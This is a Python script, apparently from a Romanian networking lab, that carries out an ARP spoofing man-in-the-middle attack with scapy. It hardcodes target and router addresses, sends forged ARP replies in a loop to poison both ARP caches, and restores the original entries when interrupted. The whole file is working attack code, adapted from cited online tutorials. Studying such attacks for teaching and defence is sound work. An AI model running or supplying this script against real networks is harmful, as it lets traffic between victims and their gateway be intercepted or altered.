#https://www.youtube.com/watch?v=P1_P59fpdQI&t=159s&ab_channel=CodeOnBy
#https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/

import scapy.all as scapy
import time

interval = 4
#ip_tinta = input("Introduceti adresa tintei ")
#ip_router = input("Introduceti adresa routerului / default gateway ")
ip_tinta = "198.7.0.2"
ip_router="198.7.0.1"

def getmacbyip(ip):
    request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answer = scapy.srp(packet, timeout = 2, verbose = False)[0]

    if answer:
        mac = answer[0][1].hwsrc
        print("Adresa MAC gasita!", mac)
        return mac
    
    print("[!] Eroare in gasirea adresei MAC")
    return None

def spoof(ip_tinta,ip_spoof):
    pachet = scapy.ARP(op = 2, pdst = ip_tinta, hwdst = getmacbyip(ip_tinta), psrc = ip_spoof)
    scapy.send(pachet, verbose = False)

def restore(ip_sursa, ip_destinatie):
    mac_destinatie = getmacbyip(ip_destinatie)
    mac_sursa = getmacbyip(ip_sursa)
    pachet = scapy.ARP(op = 2, pdst = ip_destinatie, hwdst = mac_destinatie, psrc = ip_sursa, hwsrc = mac_sursa)
    scapy.send(pachet, verbose = False)

try:
    print("IP tinta: ", ip_tinta)
    print("IP router: ", ip_router)
    print("Incepe atacul...")
    while True:
        print("Pachet trimis la tinta!")
        spoof(ip_tinta, ip_router)
        print("Pachet trimis la router!")
        spoof(ip_router, ip_tinta)
        print()
        time.sleep(interval)
except KeyboardInterrupt:
    print("Atac incheiat!")
    print("Revenire la configurarea initiala...")
    restore(ip_router, ip_tinta)
    restore(ip_tinta, ip_router)
    print("Revenire incheiata cu succes!")
